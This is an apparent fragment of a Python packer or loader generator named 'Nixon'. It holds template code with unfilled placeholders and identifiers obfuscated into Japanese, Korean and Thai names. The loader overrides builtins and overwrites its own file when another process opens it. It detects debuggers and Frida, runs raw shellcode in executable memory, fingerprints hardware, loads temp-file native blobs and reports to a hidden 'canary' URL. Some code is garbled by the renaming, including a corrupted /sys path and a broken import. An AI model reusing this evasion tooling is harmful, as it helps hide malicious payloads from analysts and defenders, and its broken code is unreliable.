_nixon_サブプロセス서브=__import__(_nixon_逆(_nixon_字(115)+_nixon_字(115)+_nixon_字(101)+_nixon_字(99)+_nixon_字(111)+_nixon_字(114)+_nixon_字(112)+_nixon_字(98)+_nixon_字(117)+_nixon_字(115)))
_nixon_ウラルユーアールエル유알엘=__import__(_nixon_逆(_nixon_字(98)+_nixon_字(105)+_nixon_字(108)+_nixon_字(108)+_nixon_字(114)+_nixon_字(117)))
_nixon_エスエスエル에스=__import__(_nixon_逆(_nixon_字(108)+_nixon_字(115)+_nixon_字(115)))
_NX_ATTR_MAP = {{}}
_NX_SENTINEL = object()
_nixon_orig_getattr = getattr
try:
    import contextvars
    _nx_rec_guard = contextvars.ContextVar('_nx_r', default=False)
except:
    _nx_rec_guard = _nixon_スレッディング스레딩.local()
def _nixon_getattr_hook(obj, name, default=_NX_SENTINEL):
    is_cv = hasattr(_nx_rec_guard, 'get')
    if (is_cv and _nx_rec_guard.get()) or (not is_cv and _nixon_orig_getattr(_nx_rec_guard, 'a', False)):
        if default is not _NX_SENTINEL: return default
        raise AttributeError(name)
    if is_cv: t = _nx_rec_guard.set(True)
    else: _nx_rec_guard.a = True
    try:
        try:
            return _nixon_orig_getattr(obj, name)
        except AttributeError:
            pass
        try:
            h = _nixon_ハッシュ해시.sha256((name + "_SALT").encode()).hexdigest()[:16]
            if h in _NX_ATTR_MAP:
                real_name = _NX_ATTR_MAP[h]
                return object.__getattribute__(obj, real_name)
        except: pass
        if default is not _NX_SENTINEL: return default
        raise AttributeError
    finally:
        if is_cv: _nx_rec_guard.reset(t)
        else: _nx_rec_guard.a = False
_nixon_ビルトイン빌트인.getattr = _nixon_getattr_hook
__import__(_nixon_逆(_nixon_字(99)+_nixon_字(98)+_nixon_字(97)+_nixon_字(46)+_nixon_字(98)+_nixon_字(105)+_nixon_字(108)+_nixon_字(116)+_nixon_字(114)+_nixon_字(111)+_nixon_字(112)+_nixon_字(109)+_nixon_字(105)))
__import__(_nixon_逆(_nixon_字(108)+_nixon_字(105)+_nixon_字(116)+_nixon_字(117)+_nixon_字(46)+_nixon_字(98)+_nixon_字(105)+_nixon_字(108)+_nixon_字(116)+_nixon_字(114)+_nixon_字(111)+_nixon_字(112)+_nixon_字(109)+_nixon_字(105)))
__import__(_nixon_逆(_nixon_字(116)+_nixon_字(115)+_nixon_字(101)+_nixon_字(117)+_nixon_字(113)+_nixon_字(101)+_nixon_字(114)+_nixon_字(46)+_nixon_字(98)+_nixon_字(105)+_nixon_字(108)+_nixon_字(108)+_nixon_字(114)+_nixon_字(117)))
_nixon_システム시스템=_nixon_システム시스템;_nixon_オペレーション운영=_nixon_オペレーション운영;_nixon_ベース베이스=_nixon_ベース베이스;_nixon_アイオー입출력=_nixon_アイオー입출력;_nixon_ジップ압축파일=_nixon_ジップ압축파일;_nixon_圧縮압축=_nixon_圧縮압축;_nixon_ハッシュ해시=_nixon_ハッシュ해시;_nixon_エルゼット압축=_nixon_エルゼット압축;_nixon_構造구조=_nixon_構造구조;_nixon_時間시간=_nixon_時間시간;_nixon_テンプ임시=_nixon_テンプ임시;_nixon_シャトル셔틀=_nixon_シャトル셔틀;_nixon_アテクシット종료=_nixon_アテクシット종료;_nixon_ランパイ실행=_nixon_ランパイ실행;_nixon_ジェイソン제이슨=_nixon_ジェイソン제이슨;_nixon_ユーユーアイ유유아=_nixon_ユーユーアイ유유아;_nixon_ランダム랜덤=_nixon_ランダム랜덤;_nixon_インスペクト검사=_nixon_インスペクト검사;_nixon_プラットフォーム플랫폼=_nixon_プラットフォーム플랫폼;_nixon_マーシャル마샬=_nixon_マーシャル마샬;_nixon_ガベージ가비지=_nixon_ガベージ가비지;_nixon_トレースバック트랙=_nixon_トレースバック트랙;_nixon_エイチマック에이치=_nixon_エイチマック에이치;_nixon_シークレット시크릿=_nixon_シークレット시크릿;_nixon_シータイプ씨타입=_nixon_シータイプ씨타입;_nixon_ビルトイン빌트인=_nixon_ビルトイン빌트인;_nixon_ソケット소켓=_nixon_ソケット소켓;_nixon_スレッディング스레딩=_nixon_スレッディング스레딩;_nixon_マルチ멀티=_nixon_マルチ멀티
pass
{VAR_ENC_BLOB} = "__NX_STR_TABLE_SENTINEL__"
{VAR_EK_A} = "__NX_STR_KEY_A__"
{VAR_EK_B} = "__NX_STR_KEY_B__"
{VAR_STR_TABLE} = None
def {FUNC_EXTRACT_WIPE}():
    import threading as _nx_thr
    def _nx_scan():
        try:
            _s_argv = chr(97)+chr(114)+chr(103)+chr(118)
            _s_win = chr(87)+chr(105)+chr(110)+chr(100)+chr(111)+chr(119)+chr(115)
            _s_proc = chr(47)+chr(112)+chr(114)+chr(111)+chr(99)
            _s_fd = chr(102)+chr(100)
            _self_path = _nixon_オペレーション운영.path.abspath(_nixon_システム시스템.argv[0] if hasattr(_nixon_システム시스템, _s_argv) and _nixon_システム시스템.argv else __file__)
            if _nixon_プラットフォーム플랫폼.system() != _s_win:
                _proc = _s_proc
                if _nixon_オペレーション운영.path.isdir(_proc):
                    _my_pid = str(_nixon_オペレーション운영.getpid())
                    for _pid_dir in _nixon_オペレーション운영.listdir(_proc):
                        if not _pid_dir.isdigit() or _pid_dir == _my_pid: continue
                        try:
                            _fd_dir = _nixon_オペレーション운영.path.join(_proc, _pid_dir, _s_fd)
                            for _fd in _nixon_オペレーション운영.listdir(_fd_dir):
                                try:
                                    _link = _nixon_オペレーション운영.readlink(_nixon_オペレーション운영.path.join(_fd_dir, _fd))
                                    if _link == _self_path:
                                        try:
                                            with open(_self_path, chr(119)+chr(98)) as _wf: _wf.write(_nixon_オペレーション운영.urandom(_nixon_オペレーション운영.path.getsize(_self_path)))
                                        except: pass
                                        pass
                                except: continue
                        except: continue
        except: pass
    try:
        _t = _nx_thr.Thread(target=_nx_scan, daemon=True)
        _t.start()
    except Exception:
        pass
def {FUNC_TBL_INIT}():
    global {VAR_STR_TABLE}, {VAR_ENC_BLOB}, {VAR_EK_A}, {VAR_EK_B}
    if {VAR_STR_TABLE} is not None: return {VAR_STR_TABLE}
    {FUNC_EXTRACT_WIPE}()
    _ek = _nixon_ベース베이스.b85decode({VAR_EK_A}.encode()) + _nixon_ベース베이스.b85decode({VAR_EK_B}.encode())
    _raw_enc = _nixon_ベース베이스.b85decode({VAR_ENC_BLOB}.encode())
    _raw_dec = bytes([_raw_enc[_i] ^ _ek[_i % len(_ek)] for _i in range(len(_raw_enc))])
    {VAR_STR_TABLE} = _nixon_マーシャル마샬.loads(_nixon_圧縮압축.decompress(_raw_dec))
    try:
        {VAR_ENC_BLOB} = None
        {VAR_EK_A} = None
        {VAR_EK_B} = None
    except: pass
    return {VAR_STR_TABLE}
_nx_salt_m = ({i_salt_val} >> 3) & 0xFF
def {FUNC_STR_DEC}(idx):
    try:
        _t = {FUNC_TBL_INIT}()
        _r = bytes([114^_nx_salt_m,111^_nx_salt_m,117^_nx_salt_m,116^_nx_salt_m,101^_nx_salt_m,114^_nx_salt_m])
        _r = bytes([_b ^ _nx_salt_m for _b in _r]).decode()
        _tb = bytes([116^_nx_salt_m,97^_nx_salt_m,98^_nx_salt_m,108^_nx_salt_m,101^_nx_salt_m,115^_nx_salt_m])
        _tb = bytes([_b ^ _nx_salt_m for _b in _tb]).decode()
        _kk = bytes([107^_nx_salt_m,101^_nx_salt_m,121^_nx_salt_m,115^_nx_salt_m])
        _kk = bytes([_b ^ _nx_salt_m for _b in _kk]).decode()
        _ff = bytes([70^_nx_salt_m,82^_nx_salt_m,65^_nx_salt_m,71^_nx_salt_m])
        _ff = bytes([_b ^ _nx_salt_m for _b in _ff]).decode()
        route = _t[_r].get(idx)
        if not route: return ""
        rtype, tbl, tbl_idx = route[0], route[1], route[2]
        if rtype == _ff:
            s1 = _t[_tb][tbl][tbl_idx]
            tbl2, idx2 = route[3], route[4]
            s2 = _t[_tb][tbl2][idx2]
            Nixon_Enc_b64 = s1 + s2
            tbl_key = _nixon_ベース베이스.b64decode(_t[_kk][tbl])
        else:
            Nixon_Enc_b64 = _t[_tb][tbl][tbl_idx]
            tbl_key = _nixon_ベース베이스.b64decode(_t[_kk][tbl])
        combined = _nixon_ベース베이스.b64decode(Nixon_Enc_b64)
        Nixon_Enc_bytes = combined[:-8]
        stored_hmac = combined[-8:]
        idx_key = _nixon_ハッシュ해시.sha256(tbl_key + str(tbl_idx).encode()).digest()
        expected_hmac = _nixon_エイチマック에이치.new(tbl_key, Nixon_Enc_bytes, _nixon_ハッシュ해시.sha256).digest()[:8]
        if not _nixon_エイチマック에이치.compare_digest(stored_hmac, expected_hmac): return ""
        _dec = bytes([b ^ idx_key[i % 32] for i, b in enumerate(Nixon_Enc_bytes)])
        try: return _dec.decode('utf-8')
        except: return _dec.decode('latin-1')
    except: return ""
_打印輸出한글ไทย=print;_字符串టెక్స్ట్=str;_整数數字หมาย=int;_浮點小数ทศนิ=float;_布爾真假ค่าจ=bool;_列表清單รายก=list;_字典辭典พจนา=dict;_集合集體เซ็ต=set;_元組組合ทูเพ=tuple;_長度數量ความย=len;_範圍區間ช่วง=range;_枚舉列舉แจกแ=enumerate;_壓縮打包ซิป=zip;_映射對應แผนท=map;_過濾篩選กรอง=filter;_排序整理เรียง=sorted;_反轉倒序กลับ=reversed;_最小极值ต่ำสุ=min;_最大極值สูงสุ=max;_總和加總ผลรว=sum;_絕對值절대값=abs;_四捨五入반올림=round;_幂函次方ยกกำ=pow;_字符符號อักขร=chr;_序號碼值ค่าเล=ord;_十六進位เลขฐ=hex;_八進制ฐานแป=oct;_二進位ไบนา=bin;_表示顯示การแ=repr;_類型種類ประเภ=type;_實例檢查ตรวจส=isinstance;_子類檢查ตรวจร=issubclass;_可呼叫เรียก=callable;_有屬性มีคุณ=hasattr;_取屬性ดึงคุ=getattr;_設屬性ตั้งค=setattr;_刪屬性ลบคุณ=delattr;_開啟打開เปิดไ=open;_輸入接收รับข้=input;_求值計算คำนวณ=eval;_執行運行ดำเนิ=exec;_編譯轉換คอมไพ=compile;_全域變數ตัวแป=globals;_區域變數ท้องถ=locals;_屬性詞典คุณสม=vars;_目錄列表ไดเรก=dir;_識別碼รหัสป=id;_雜湊散列แฮช=hash;_物件對象วัตถุ=object;_父類超類ซูเปอ=super;_位元組ไบต์=bytes;_位元陣列อาร์เ=bytearray;_格式格式รูปแบ=format;_迭代器ตัววน=iter;_下一個ถัดไป=next;_任意有任มีใดๆ=any;_全部所有ทั้งหม=all;_例外異常ข้อยก=Exception;_值錯誤ค่าผิด=ValueError;_類型錯誤ชนิดผ=TypeError;_鍵錯誤คีย์ผ=KeyError;_索引錯誤ดัชนี=IndexError;_屬性錯誤คุณสม=AttributeError;_運行錯誤รันไท=RuntimeError;_停止迭代หยุดว=StopIteration
_REQUIRED_VERSION = {required_python_version}
# Batch-3 CI scope: the SKIP bypass only applies when the CI gate var is
# ALSO set (NIXON_CI or NIXON_ALLOW_SKIP); prod artifacts hold the gate
# with SKIP alone. Rule: new version-gate bypasses require the CI scope.
_NX_SKIP_ON = bool(_nixon_オペレーション운영.environ.get('NIXON_VERIFY_SKIP_VERSION_CHECK'))
_NX_CI_ON = bool(_nixon_オペレーション운영.environ.get('NIXON_CI') or _nixon_オペレーション운영.environ.get('NIXON_ALLOW_SKIP'))
if _nixon_システム시스템.version_info[:2] != _REQUIRED_VERSION and not (_NX_SKIP_ON and _NX_CI_ON):
    _req = f"{{_REQUIRED_VERSION[0]}}.{{_REQUIRED_VERSION[1]}}"
    _cur = f"{{_nixon_システム시스템.version_info[0]}}.{{_nixon_システム시스템.version_info[1]}}"
    print(f"[!] Incompatible Python Version.\\n[!] Required: {{_req}} | Found: {{_cur}}")
    _nixon_システム시스템.exit(1)
{VAR_IS_DEBUG} = {is_debug_val}
{VAR_CANARY_URL} = "{canary_url_enc}"
{audit_hook_source}
def {FUNC_LOG}(msg):
    if {VAR_IS_DEBUG}:
        _nixon_システム시스템.stdout.write(str(msg) + "\n")
        _nixon_システム시스템.stdout.flush()
if not {VAR_IS_DEBUG}:
    pass
{FUNC_LOG}("[DEBUG] Init start...")
_STR_SESSION_KEY = {STR_SESSION_KEY}
BUILD_TIMESTAMP = {build_timestamp}
# The rotation window at pack time (always 0 for a fresh build).  Emitted
# so the loader derives the same key whenever it runs.
_NX_BUILD_WINDOW = 0

_BUILD_ID = "{build_id}"
MORPH_MAP_A = {morph_map_a}
MORPH_MAP_B = {morph_map_b}
MORPH_MAP = [MORPH_MAP_A, MORPH_MAP_B]
_I_SALT = {i_salt}
pass
_NX_ATTR_MAP.update({ATTR_MAP})
{FUNC_LOG}("[DEBUG] Decryptor loaded...")
FORCE_NATIVE_MODE = {force_native}
{VAR_CHECKSUM} = "{dummy_checksum}"; _SIG_ANCHOR_ = "__SIG_ANCHOR__"
{VAR_HMAC_SIG} = "{dummy_hmac}"; _HMAC_ANCHOR_ = "__HMAC_ANCHOR__"
_HMAC_KEY_ = b"{HMAC_SECRET_HEX}".decode()
{VAR_NONCE} = {nonce}
{VAR_PART_A} = {key_part_a}
{VAR_PART_B} = {key_part_b}
{VAR_S0_A} = {s0_a}
{VAR_S0_B} = {s0_b}
{VAR_RECIPE_IN} = "{recipe_in_Nixon_Enc}" 
{VAR_RECIPE_OUT} = "{recipe_out_Nixon_Enc}" 
{VAR_HW_LOCK} = {hw_lock_bool}
{VAR_EXP_DATE} = {exp_timestamp}
SWIZZLE_KEY = {swizzle_key}
{VAR_NET_URL} = "{net_url_Nixon_Enc}"
{VAR_NATIVE_BLOB} = {native_blobs_json}
{VAR_TOTAL_PARTS} = {total_parts}
{VAR_ONE_SHOT} = {one_shot_bool}
{VAR_ENTROPY_MARKER} = {entropy_marker_val}
VM_OP_MAP_1 = {vm_op_map_1}
VM_OP_MAP_2 = {vm_op_map_2}
VM_OP_MAP_3 = {vm_op_map_3}
VM_BC_3_ENC = {vm_bc_3_Nixon_Enc}
VM_BC_2_ENC = {vm_bc_2_Enc}
VM_BC_1 = {vm_bc_1}
VM_SEED_VAL = {vm_seed_val}
{FUNC_LOG}("[DEBUG] Config loaded...")
{payload_parts_code}
{FUNC_LOG}("[DEBUG] Payload loaded...")
{decoy_code}
{dead_code}
{cipher_source}
{vm_source}
{decoy_vm_source} 
{importer_source}
{secure_mem_source}
{fake_crypto_source}
{merkle_tree_source}
{gc_manipulation_source}
{reflective_loader_source}
{hardening_source}
{nanomite_source}
{native_loader_source}
{anti_sandbox_source}
{hook_source}
{remove_entropy_code}
{NEXT_H_SOURCE}
{mask_source}
{anti_frida_source}
{canary_source}
{antman_source}
{rdtsc_source}
{doh_source}
{tls_ca_source}
{api_hash_source}
{stack_str_source}
{integrity_check_source}
{timing_sidechain_source}
{bytecode_patcher_source}
{chimeric_jit_source}
{ghost_func_source}
{self_morph_graph_source}
{honey_decoy_source}
{multidim_encode_source}
{isr_encoder_source}
{stack_cfi_source}
{exec_trace_source}
{smart_decoy_source}
{mem_randomizer_source}
{poly_const_source}
{timing_key_source}
{non_determ_source}
{proactive_corrupt_source}
{quine_check_source}
{metamorphic_source}
{quantum_entangle_source}
{temporal_logic_source}
{commitment_source}
{gordian_knot_source}

{custom_vm_source}
{whitebox_crypto_source}
{shapeshifter_source}
{nanomite_guard_source}
{logic_entangle_source}
{rolling_isa_source}
{whitebox_enhanced_source}
{temporal_degrade_source}
{code_bloat_source}
{cross_platform_guard_source}
{attrition_warfare_source}
{fhe_source}
{oram_source}
{semantic_synth_source}
{triple_redundancy_source}
{FUNC_LOG}("[DEBUG] Classes loaded...")
# [THE 1% RULE] Verify Master Key via FHE/ORAM pipeline (Hardware Accelerated)
try:
    _BATCH_SIZE_ = 1024
    _HMAC_KEY_ENC_ = [__import__('secrets').randbelow(100) + 1 for _ in range(_BATCH_SIZE_)]
    _fhe_ = {VAR_FHE_CLS}(batch_size=_BATCH_SIZE_)
    _oram_ = {VAR_ORAM_CLS}(size=_BATCH_SIZE_)
    {FUNC_LOG}(f"[DEBUG] FHE Type: {{type(_fhe_)}} | ORAM Type: {{type(_oram_)}}")
    # A REAL round-trip: encrypt the batch, add it to a second encrypted
    # batch (the homomorphic property), decrypt, and CHECK that the
    # plaintext came back.  The previous bootstrap decrypted a
    # PLAINTEXT array and stored the result without checking anything,
    # so it verified nothing at all.
    _KEY2_ = [__import__('secrets').randbelow(100) + 1 for _ in range(_BATCH_SIZE_)]
    _CT1_ = _fhe_.encrypt_batch(_HMAC_KEY_ENC_)
    _CT2_ = _fhe_.encrypt_batch(_KEY2_)
    _CTS_ = _fhe_.add_batch(_CT1_, _CT2_)
    _DEC_ = _fhe_.dec_batch(_CTS_)
    _EXPECT_ = [_HMAC_KEY_ENC_[i] ^ _KEY2_[i] for i in range(_BATCH_SIZE_)]
    if [_DEC_[i] & 0x7fffffff for i in range(_BATCH_SIZE_)] != _EXPECT_:
        raise ValueError("FHE round-trip mismatch")
    if [_DEC_[i] & 0x7fffffff for i in range(_BATCH_SIZE_)] == _HMAC_KEY_ENC_:
        raise ValueError("FHE round-trip returned the plaintext unchanged")
    _oram_.access('write', 0x1337, sum(_fhe_.dec_batch(_CT1_)) & 0xffffffff)
    {FUNC_LOG}("[DEBUG] FHE/ORAM bootstrap successful (round-trip verified).")
except Exception as _e:
    {FUNC_LOG}(f"[WARN] FHE/ORAM bootstrap failed: {{_e}}")
    {VAR_TEMPORAL_DEGRADE_CLS}.{METHOD_TD_INJECT_ANOMALY}(5)

BLOB_KEY = bytes.fromhex("{NATIVE_BLOB_KEY_HEX}")'''
INTEGRITY_CHECK_SOURCE = r'''
def _check_interpreter_integrity():
    try:
        if _nixon_オペレーション운영.name == 'nt':
            try:
                exe_path = _nixon_システム시스템.executable
                with open(exe_path, "rb") as f:
                    content = f.read(1024*1024)
                if bytes.fromhex("484f4f4b5f53454354494f4e") in content or bytes.fromhex("50595f4c4f47474552") in content or bytes.fromhex("6465627567676572") in content.lower():
                    return False
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                h_mod = k32.GetModuleHandleW("python3" + str(_nixon_システム시스템.version_info.minor) + ".dll")
                if not h_mod: return False
            except: pass
        safe_builtins = {"exec": "built-in function exec", "eval": "built-in function eval", "compile": "built-in function compile"}
        for name, expected in safe_builtins.items():
            actual = getattr(_nixon_ビルトイン빌트인, name, None)
            if actual and expected not in str(actual): return False
        return True
    except: return True
if not _check_interpreter_integrity():
    _nixon_ハッシュ해시 = None
    globals()['_nixon_ハッシュ해시'] = None
'''
LOADER_BODY = r'''def {FUNC_TRIGGER_ALERT}(reason):
    url = {FUNC_STR_DEC}({VAR_CANARY_URL})
    if url: {VAR_FUNC_CANARY}(reason, url)
def {FUNC_WIPE}(data):
    if isinstance(data, bytearray):
        for _ in range(3):
            for i in range(len(data)):
                data[i] = _nixon_シークレット시크릿.randbits(8)
        for i in range(len(data)): data[i] = 0
    try: del data
    except: pass
    _nixon_ガベージ가비지.collect(); _nixon_ガベージ가비지.collect()
def _emergency_cleanup(signum=None, frame=None):
    for var_name in ['ctx', 'raw', 'dec', 'dec_padded', 'zip']:
        if var_name in globals():
            {FUNC_WIPE}(globals()[var_name])
    if signum is not None: import sys; sys.exit(0)
_nixon_アテクシット종료.register(_emergency_cleanup)
_NX_POISON_KEY = b''.__class__([95, 78, 88, 95, 80, 79, 73, 83, 79, 78]).decode()
globals()[_NX_POISON_KEY] = 0
def _accumulate_poison(val):
    p = globals().get(_NX_POISON_KEY, 0)
    globals()[_NX_POISON_KEY] = (p + val) & 0xFF
try:
    _nixon_シグナル신호 = __import__("signal")
    _nixon_シグナル신호.signal(_nixon_シグナル신호.SIGTERM, _emergency_cleanup)
    _nixon_シグナル신호.signal(_nixon_シグナル신호.SIGINT, _emergency_cleanup)
except: pass
def constant_time_compare(a, b):
    if len(a) != len(b): return False
    result = 0
    for x, y in zip(a, b): result |= x ^ y
    return result == 0
def _nx_strict_fail(reason):
    """Terminate when a detection fires and the operator armed it.

    The environment detections (sandbox, emulator, debugger, geo-fence,
    licence) are SIGNALS by default: they perturb the loader's hash
    chain, so the artifact behaves differently on a hostile host.  With
    --strict-detections they become gates and the artifact dies.
    """
    if not globals().get("_NX_STRICT_DETECTIONS"):
        return
    try:
        import os as _nx_st_os
        _nx_st_os._exit(137)
    except Exception:
        pass
def _nx_self_fail(reason):
    """Terminate on a self-integrity mismatch.

    The loader checks its OWN bytes against the Merkle root and the HMAC
    the build computed over the finished loader.  Both verdicts used to
    be discarded with a bare `pass`, so a tampered artifact carried on.
    A mismatch is now terminal: wipe and exit 137, the same shape as
    the kill ladder in the inner loader.
    """
    try:
        import os as _nx_osf
        try:
            import sys as _nx_sysf
            _nx_sysf.stdout.flush()
            _nx_sysf.stderr.flush()
        except Exception:
            pass
        _nx_osf._exit(137)
    except Exception:
        try:
            import sys as _nx_sysf
            _nx_sysf.exit(137)
        except Exception:
            pass
def {FUNC_SELF}():
    try:
        with open(__file__, 'rb') as f: lines = f.readlines()
        # The lines that hold the EXPECTED values are excluded from the
        # hash: a value cannot be part of what it describes.  They are
        # identified by the VALUES themselves, not by a marker string.
        # A marker can be edited to still match -- and the marker's own
        # line was excluded from the hash too, so the edit was invisible
        # to the check.  With this filter the check's own code is hashed
        # like everything else.
        _nx_er = {VAR_CHECKSUM}
        _nx_eh = {VAR_HMAC_SIG}
        filtered_lines = [l for l in lines
                          if _nx_er.encode() not in l and _nx_eh.encode() not in l]
        content = b"".join(filtered_lines)
        chunk_size = 1024
        chunks = [content[i:i+chunk_size] for i in range(0, len(content), chunk_size)]
        tree_root = {FUNC_MERKLE_BUILD}(chunks)
        root_hash = tree_root.hash if tree_root else ""
        if not constant_time_compare(root_hash.encode(), _nx_er.encode()):
            _nx_self_fail("merkle")
        secret = bytes.fromhex(_HMAC_KEY_)
        sig = _nixon_エイチマック에이치.new(secret, content, _nixon_ハッシュ해시.sha256).hexdigest()
        if sig != _nx_eh:
            _nx_self_fail("hmac")
        return _nixon_ハッシュ해시.sha256(content).digest()
    except SystemExit:
        raise
    except Exception as e:
        try:
            import os as _nx_os_diag
            _nx_diag = "%s exists=%s cwd=%s dir=%s" % (
                __file__,
                _nx_os_diag.path.exists(__file__),
                _nx_os_diag.getcwd(),
                sorted(_nx_os_diag.listdir(_nx_os_diag.path.dirname(__file__))))
        except Exception as _nx_diag_e:
            _nx_diag = "no diagnostics: %s" % (_nx_diag_e,)
        {FUNC_LOG}(f"[WARN] Self-check error: {{e}} ({{_nx_diag}})")
        # A self-check that could not RUN is a failed self-check.  It
        # used to log and continue, so editing the check's own code was
        # enough to disable it: the artifact carried on and exited 0.
        _nx_self_fail("self-check error")

def {FUNC_LIVE_CHK}():
    digest = _nixon_ハッシュ해시.sha256()
    try:
        bad_mods = ["frida", "xposed", "gum-js", "cheat engine", "scylla", "titanhide", "x64dbg", "processhacker"]
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Windows":
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                psapi = _nixon_シータイプ씨타입.windll.psapi
                h_proc = k32.GetCurrentProcess()
                mod_handles = (_nixon_シータイプ씨타입.c_void_p * 1024)()
                cb_needed = _nixon_シータイプ씨타입.c_ulong()
                if psapi.EnumProcessModules(h_proc, _nixon_シータイプ씨타입.byref(mod_handles), _nixon_シータイプ씨타입.sizeof(mod_handles), _nixon_シータイプ씨타입.byref(cb_needed)):
                    count = int(cb_needed.value / _nixon_シータイプ씨타입.sizeof(_nixon_シータイプ씨타입.c_void_p))
                    buff = _nixon_シータイプ씨타입.create_string_buffer(260)
                    for i in range(count):
                        if psapi.GetModuleBaseNameA(h_proc, mod_handles[i], buff, 260):
                            name = buff.value.decode('latin1').lower()
                            for bad in bad_mods:
                                if bad in name: digest.update(b"BAD_MOD")
            elif _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/proc/self/maps", "r") as f:
                    content = f.read().lower()
                    for bad in bad_mods:
                        if bad in content: digest.update(b"BAD_MOD")
        except: pass
        if _nixon_プラットフォーム플랫폼.system() == "Windows":
            try:
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                h_k32 = k32.GetModuleHandleA(b"kernel32.dll")
                h_ntdll = k32.GetModuleHandleA(b"ntdll.dll")
                funcs = [
                    (h_k32, b"CreateFileW"), 
                    (h_k32, b"VirtualAlloc"), 
                    (h_k32, b"IsDebuggerPresent"),
                    (h_ntdll, b"NtQueryInformationProcess")
                ]
                for h_mod, fn_name in funcs:
                    if not h_mod: continue
                    addr = k32.GetProcAddress(h_mod, fn_name)
                    if not addr: continue
                    first_byte = _nixon_シータイプ씨타입.string_at(addr, 1)
                    if first_byte == b'\xCC':
                        digest.update(b"BREAKPOINT_DETECTED")
            except: pass
    except: digest.update(b"ERR")
    return digest.digest()
def {FUNC_HEAP_WALK}():
    try:
        bad_sigs = ["pydevd", "pdb", "debugpy", "tvm_obj", "frida"]
        count = 0
        for obj in _nixon_ガベージ가비지.get_objects():
            count += 1
            if count > 5000: break
            if isinstance(obj, types.ModuleType):
                name = getattr(obj, "__name__", "")
                for b in bad_sigs:
                    if b in name: return True
            if isinstance(obj, str) and len(obj) < 100:
                for b in bad_sigs:
                    if b in obj: return True
    except: pass
    return False
def {FUNC_DECOY_PROC}():
    try:
        d = {VAR_CLS_DECOY_VM}()
        for _ in range(5): 
            d.stack.append(d.{METHOD_MIX}())
    except: pass
def {FUNC_HW_BIND}():
    if not {VAR_HW_LOCK}: return b'\x00' * 32
    ids = []
    try:
        if _nixon_プラットフォーム플랫폼.machine() == "x86_64":
            sc = b"\x53\xb8\x01\x00\x00\x00\x0f\xa2\x89\xc3\x5b\xc3"
            if _nixon_プラットフォーム플랫폼.system() == "Windows":
                k32 = _nixon_シータイプ씨타입.windll.kernel32
                p = k32.VirtualAlloc(None, 64, 0x3000, 0x40)
                _nixon_シータイプ씨타입.memmove(p, sc, len(sc))
                ids.append(str(_nixon_シータイプ씨타입.CFUNCTYPE(_nixon_シータイプ씨타입.c_uint32)(p)()))
                k32.VirtualFree(p, 0, 0x8000)
            elif _nixon_プラットフォーム플랫폼.system() == "Linux":
                libc = _nixon_シータイプ씨타입.CDLL(None)
                libc.mmap.restype = _nixon_シータイプ씨타입.c_void_p
                p = libc.mmap(0, 4096, 7, 0x22, -1, 0)
                _nixon_シータイプ씨타입.memmove(p, sc, len(sc))
                ids.append(str(_nixon_シータイプ씨타입.CFUNCTYPE(_nixon_シータイプ씨타입.c_uint32)(p)()))
                libc.munmap(p, 4096)
    except: pass
    try:
        if _nixon_プラットフォーム플랫폼.system() == "Linux":
            ids.append(str(_nixon_オペレーション운영.stat("/").st_ino))
            try:
                with open("/_nixon_システム시스템/class/dmi/id/product_uuid", "r") as f: ids.append(f.read().strip())
            except: pass
            try:
                with open("/etc/machine-id", "r") as f: ids.append(f.read().strip())
            except: pass
            try:
                if _nixon_オペレーション운영.path.exists("/system/build.prop"):
                    import _nixon_サブプロセス서브
                    s = _nixon_サブプロセス서브.check_output(["getprop", "ro.serialno"]).decode().strip()
                    if s: ids.append(s)
            except: pass
        elif _nixon_プラットフォーム플랫폼.system() == "Windows":
            ids.append(_nixon_サブプロセス서브.check_output(["wmic", "csproduct", "get", chr(85)+chr(85)+chr(73)+chr(68)]).decode().split()[-1].strip())
        elif _nixon_プラットフォーム플랫폼.system() == "Darwin":
            try:
                out = _nixon_サブプロセス서브.check_output(["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"]).decode()
                for line in out.split("\n"):
                    if "IOPlatformUUID" in line:
                        ids.append(line.split('=')[1].strip().strip('"'))
                        break
            except: pass
    except: pass
    if not ids: ids.append(_nx_mac())
    return "|".join(ids).encode()
def {FUNC_DERIVE_INTEGRITY}():
    h = {FUNC_SELF}()
    return _nixon_エイチマック에이치.new(_I_SALT, h, _nixon_ハッシュ해시.sha256).digest()
def {FUNC_DERIVE_ENV}(k_int):
    hw = {FUNC_HW_BIND}()
    lc = {FUNC_LIVE_CHK}()
    # The pack-time window, emitted as a constant.  Recomputing it from the
    # wall clock made the derived key change every 30 days, so an artefact
    # would stop decrypting a month after it was built: at pack the window
    # is always 0, at run it becomes 1 (and so on), and k_dec differs.
    w = _NX_BUILD_WINDOW
    msg = k_int + hw + lc + str(w).encode()
    return _nixon_ハッシュ해시.sha256(msg).digest()
def {FUNC_UNLOCK_VM}(k_env, payload_str, part_a, part_b):
    vm_inst = None
    if len({VAR_NATIVE_BLOB}) > 10:
        try:
            blob = _nixon_ベース베이스.b64decode({VAR_NATIVE_BLOB})
            sfx = ".so" if _nixon_プラットフォーム플랫폼.system() == "Linux" else ".pyd"
            t_fd, t_path = _nixon_テンプ임시.mkstemp(suffix=sfx)
            _nixon_オペレーション운영.close(t_fd)
            with open(t_path, "wb") as f: f.write(blob)
            spec = _nixon_インポート임포트.util.spec_from_file_location("native_vm", t_path)
            vm_mod = _nixon_インポート임포트.util.module_from_spec(spec)
            spec.loader.exec_module(vm_mod)
            _nixon_アテクシット종료.register(lambda: _nixon_オペレーション운영.unlink(t_path) if _nixon_オペレーション운영.path.exists(t_path) else None)
            vm_inst = vm_mod.NativeVM(VM_OP_MAP_2, 0)
        except: pass
    if not vm_inst: vm_inst = {VAR_VM_CLS}(VM_OP_MAP_3, 0)
    inputs = [part_a, part_b, payload_str]
    vm1 = {VAR_VM_CLS}(VM_OP_MAP_1, 0)
    k_vm1 = vm1.{METHOD_RUN}(VM_BC_1, [0,0,0])
    bc2 = bytearray(VM_BC_2_ENC)
    for i in range(len(bc2)): bc2[i] ^= k_vm1[i % len(k_vm1)]
    vm2 = {VAR_VM_CLS}(VM_OP_MAP_2, 0)
    k_vm2 = vm2.{METHOD_RUN}(bytes(bc2), [0,0,0])
    bc3 = bytearray(VM_BC_3_ENC)
    for i in range(len(bc3)): bc3[i] ^= k_vm2[i % len(k_vm2)]
